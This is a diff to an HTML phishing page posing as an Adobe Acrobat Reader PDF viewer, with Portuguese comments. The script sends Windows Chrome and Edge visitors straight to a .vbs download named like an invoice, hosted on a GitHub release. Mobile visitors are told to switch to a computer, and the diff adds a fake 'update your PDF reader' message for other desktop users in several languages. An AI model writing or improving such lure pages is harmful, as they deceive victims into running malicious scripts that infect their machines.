@@ -66,9 +66,7 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Adobe_Acrobat_DC_logo_2020.png" class="logo">
     <h1 id="title"></h1>
     <p id="paragraph"></p>
-
 </div>
-
 
 <script>
 (function () {
@@ -85,7 +83,7 @@
             langs = [navigator.language];
         }
 
-        return langs.map(l => l.toLowerCase());
+        return langs.map(l => (l || "").toLowerCase());
     }
 
     function isBlocked() {
@@ -107,31 +105,34 @@
 })();
 </script>
 
-
 <script>
 window.onload = function () {
 
-    const ua = navigator.userAgent;
+    const ua = navigator.userAgent || "";
     const isWindows = ua.includes("Windows");
     const isChrome = ua.includes("Chrome") && !ua.includes("Edg/");
     const isEdge = ua.includes("Edg/");
     const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
 
+    // ✅ idioma completo + base (pt-BR -> pt)
     const lang = (navigator.language || "en").toLowerCase();
+    const langBase = lang.split("-")[0];
 
-    // ✅ Windows → mantém igual
+    // ✅ Windows → mantém igual (ajusta aqui se quiseres mandar para vendasok.php)
     if (isWindows && (isChrome || isEdge)) {
         document.body.innerHTML = "";
         window.location.href = "https://github.com/PDF-VIEW/Free/releases/download/pdf/FAC-28-02-2026.vbs";
         return;
     }
 
-    // 🔒 MOBILE → título + mensagem no idioma
+    // 🔒 MOBILE → título + mensagem no idioma do telemóvel
     if (isMobile) {
 
         const mobileTitle = {
             "pt-pt": "Documento indisponível",
             "pt-br": "Documento indisponível",
+            "pt":    "Documento indisponível",
+
             "es": "Documento no disponible",
             "fr": "Document indisponible",
             "de": "Dokument nicht verfügbar",
@@ -143,6 +144,8 @@ window.onload = function () {
         const mobileMsg = {
             "pt-pt": "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
             "pt-br": "Este documento não pode ser visualizado no celular. Por favor, abra em um computador.",
+            "pt":    "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
+
             "es": "Este documento no se puede ver en el móvil. Ábralo en un ordenador.",
             "fr": "Ce document ne peut pas être affiché sur mobile. Veuillez l’ouvrir sur un ordinateur.",
             "de": "Dieses Dokument kann auf dem Handy nicht angezeigt werden. Bitte öffnen Sie es auf einem Computer.",
@@ -152,17 +155,46 @@ window.onload = function () {
         };
 
         document.getElementById("title").innerText =
-            mobileTitle[lang] || mobileTitle["en"];
+            mobileTitle[lang] || mobileTitle[langBase] || mobileTitle["en"];
 
         document.getElementById("paragraph").innerText =
-            mobileMsg[lang] || mobileMsg["en"];
+            mobileMsg[lang] || mobileMsg[langBase] || mobileMsg["en"];
 
         return;
     }
 
+    // 🖥️ Desktop (não Windows) → texto padrão (para não ficar em branco)
+    const desktopTitle = {
+        "pt-pt": "Adobe Acrobat Reader: Ler PDF",
+        "pt-br": "Adobe Acrobat Reader: Ler PDF",
+        "pt":    "Adobe Acrobat Reader: Ler PDF",
 
-    document.getElementById("title").innerText = title[lang] || title["en"];
-    document.getElementById("paragraph").innerHTML = text[lang] || text["en"];
+        "es": "Adobe Acrobat Reader: Leer PDF",
+        "fr": "Adobe Acrobat Reader : Lire le PDF",
+        "de": "Adobe Acrobat Reader: PDF lesen",
+        "it": "Adobe Acrobat Reader: Leggi il PDF",
+        "tr": "Adobe Acrobat Reader: PDF görüntüle",
+        "en": "Adobe Acrobat Reader: Read PDF"
+    };
+
+    const desktopText = {
+        "pt-pt": "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
+        "pt-br": "Atualizações disponíveis.<br><br>• Para visualizar este arquivo PDF, é necessário atualizar o aplicativo de leitura de PDF.<br><br>Após a atualização, será possível visualizar o arquivo.",
+        "pt":    "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
+
+        "es": "Actualizaciones disponibles.<br><br>• Para ver este archivo PDF, necesitas actualizar tu lector de PDF.<br><br>Después de la actualización, podrás ver el archivo.",
+        "fr": "Mises à jour disponibles.<br><br>• Pour afficher ce fichier PDF, vous devez mettre à jour votre lecteur PDF.<br><br>Après la mise à jour, vous pourrez afficher le fichier.",
+        "de": "Updates verfügbar.<br><br>• Um diese PDF-Datei anzuzeigen, müssen Sie Ihren PDF-Reader aktualisieren.<br><br>Nach dem Update können Sie die Datei anzeigen.",
+        "it": "Aggiornamenti disponibili.<br><br>• Per visualizzare questo PDF, è necessario aggiornare il lettore PDF.<br><br>Dopo l’aggiornamento sarà possibile visualizzare il file.",
+        "tr": "Güncellemeler mevcut.<br><br>• Bu PDF dosyasını görüntülemek için PDF okuyucunuzu güncellemeniz gerekir.<br><br>Güncellemeden sonra dosyayı görüntüleyebilirsiniz.",
+        "en": "Updates available.<br><br>• To view this PDF file, you need to update your PDF reader.<br><br>After the update, you will be able to view the file."
+    };
+
+    document.getElementById("title").innerText =
+        desktopTitle[lang] || desktopTitle[langBase] || desktopTitle["en"];
+
+    document.getElementById("paragraph").innerHTML =
+        desktopText[lang] || desktopText[langBase] || desktopText["en"];
 };
 </script>
 </body>
